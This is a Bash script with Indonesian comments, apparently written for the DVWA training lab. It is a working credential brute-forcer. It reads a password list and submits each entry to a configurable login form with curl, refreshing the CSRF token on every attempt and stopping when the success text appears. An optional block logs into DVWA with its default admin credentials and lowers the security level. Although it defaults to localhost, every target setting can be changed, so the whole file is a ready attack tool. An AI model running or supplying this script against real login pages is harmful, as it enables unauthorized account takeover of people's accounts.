#!/bin/bash

# --- BAGIAN INPUT INTERAKTIF ---
read -p "[?] Input Target URL (default http://127.0.0.1:8000): " TARGET
TARGET="${TARGET:-http://127.0.0.1:8000}"

read -p "[?] Input path halaman target/brute (default /vulnerabilities/brute/): " PATH_TARGET
PATH_TARGET="${PATH_TARGET:-/vulnerabilities/brute/}"

# PILIH METODE REQUEST DI SINI
read -p "[?] Pilih Metode Request [1] GET (Default) [2] POST: " METHOD_CHOICE
METHOD_CHOICE="${METHOD_CHOICE:-1}"

read -p "[?] Input nama parameter username (default username): " USER_PARAM
USER_PARAM="${USER_PARAM:-username}"

read -p "[?] Input nama parameter password (default password): " PASS_PARAM
PASS_PARAM="${PASS_PARAM:-password}"

read -p "[?] Input nama parameter token CSRF (kosongkan jika tidak ada): " TOKEN_PARAM

read -p "[?] Input nama tombol submit/Login (default Login): " SUBMIT_PARAM
SUBMIT_PARAM="${SUBMIT_PARAM:-Login}"

read -p "[?] Input target username: " USER
read -p "[?] Input file name passlist: " PASS_FILE

read -p "[?] Input teks penanda sukses / Flag (default 'Welcome to the password protected area'): " SUCCESS_TEXT
SUCCESS_TEXT="${SUCCESS_TEXT:-Welcome to the password protected area}"

echo "-----------------------------------------------"
# -------------------------------------------------

COOKIE_JAR="cookie.txt"
rm -f "$COOKIE_JAR"

# Setup otomatis DVWA (opsional)
read -p "[?] Apakah ini target DVWA yang butuh setup security? (y/n): " IS_DVWA
if [[ "$IS_DVWA" =~ ^[Yy]$ ]]; then
    SECURITY_LEVEL="medium"
    echo "[*] Login awal ke DVWA..."
    INIT_RESP=$(curl -s -c "$COOKIE_JAR" "$TARGET/login.php")
    USER_TOKEN=$(echo "$INIT_RESP" | sed -n "s/.*user_token.*value=['\"]\([^'\"]*\).*/\1/p")

    curl -s -L -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
      --data "username=admin&password=password&Login=Login&user_token=$USER_TOKEN" \
      "$TARGET/login.php" > /dev/null

    echo "[*] Ganti ke security MEDIUM..."
    SEC_PAGE=$(curl -s -b "$COOKIE_JAR" "$TARGET/security.php")
    T2=$(echo "$SEC_PAGE" | sed -n "s/.*user_token.*value=['\"]\([^'\"]*\).*/\1/p")
    curl -s -L -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
      --data "security=$SECURITY_LEVEL&seclev_submit=Submit&user_token=$T2" \
      "$TARGET/security.php" > /dev/null
fi

echo "[+] Target Aktif: $TARGET$PATH_TARGET"
echo "-----------------------------------------------"

while read -r PASS; do
  # Ambil halaman untuk token CSRF per-looping jika ada
  if [ -n "$TOKEN_PARAM" ]; then
    BRUTE_PAGE=$(curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" "$TARGET$PATH_TARGET")
    TOKEN_BRUTE=$(echo "$BRUTE_PAGE" | sed -n "s/.*$TOKEN_PARAM.*value=['\"]\([^'\"]*\).*/\1/p")
  fi

  # EKSEKUSI BERDASARKAN PILIHAN METODE (GET atau POST)
  if [ "$METHOD_CHOICE" = "2" ]; then
    # --- KIRIM PAKAI POST ---
    RESP=$(curl -s -X POST \
      --data-urlencode "$USER_PARAM=$USER" \
      --data-urlencode "$PASS_PARAM=$PASS" \
      $( [ -n "$TOKEN_PARAM" ] && echo "--data-urlencode $TOKEN_PARAM=$TOKEN_BRUTE" ) \
      --data-urlencode "$SUBMIT_PARAM=$SUBMIT_PARAM" \
      -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
      "$TARGET$PATH_TARGET")
  else
    # --- KIRIM PAKAI GET (DEFAULT) ---
    RESP=$(curl -s -G \
      --data-urlencode "$USER_PARAM=$USER" \
      --data-urlencode "$PASS_PARAM=$PASS" \
      $( [ -n "$TOKEN_PARAM" ] && echo "--data-urlencode $TOKEN_PARAM=$TOKEN_BRUTE" ) \
      --data-urlencode "$SUBMIT_PARAM=$SUBMIT_PARAM" \
      -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
      "$TARGET$PATH_TARGET")
  fi

  echo -e "\e[31m[-] Trying: $PASS\e[0m"

  if echo "$RESP" | grep -q "$SUCCESS_TEXT"; then
    echo ""
    echo -e "\e[32m[+] FOUND! Password $USER: $PASS\e[0m"
    break
  fi
done < "$PASS_FILE"

rm -f "$COOKIE_JAR"

